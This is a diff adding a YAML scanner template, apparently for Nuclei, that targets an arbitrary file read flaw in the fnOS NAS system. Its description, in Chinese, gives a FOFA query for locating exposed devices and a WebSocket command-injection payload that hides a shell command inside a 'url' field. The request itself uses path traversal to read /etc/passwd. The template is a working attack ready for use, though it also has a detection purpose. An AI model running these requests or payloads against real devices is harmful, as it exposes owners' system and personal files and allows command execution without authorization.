@@ -1,0 +1,27 @@
+id: fnos-app-center-static-arbitrary-file-read
+info:
+  name: 飞牛私有云fnOS app-center-static 任意文件读取漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="飞牛-私有云fnOS" || icon_hash="470295793"
+    飞牛私有云fnOS是基于Debian Linux内核开发的国产NAS操作系统，面向家庭及个人用户提供多媒体管理、文件存储及网络挂载功能。该系统在app-center-static组件中存在权限验证缺陷，攻击者可通过构造特定请求访问NAS设备上的任意文件（含系统配置文件及用户存储数据）。
+    利用需通过有效账户登录后建立WebSocket连接（http://IP:5666/websocket?type=main），使用localStorage.fnos-Secret存储的HMAC-SHA256签名发送恶意请求。示例载荷：
+    cA8dKVgUFNf/5QdKdIa7nEhaup6ObIo6D18J0am+KBQ={"reqid":"697da669697da3bc000000090f31","req":"appcgi.dockermgr.systemMirrorAdd","url":"https://test.example.com; /usr/bin/touch /tmp/hacked20260131 ; /usr/bin/echo ","name":"2"}
+    该请求会在/tmp目录生成hacked20260131文件验证漏洞存在性。漏洞披露日期：2026-02-01
+  tags: 飞牛私有云
+http:
+- raw:
+  - |
+    GET /app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - root:x:0:0
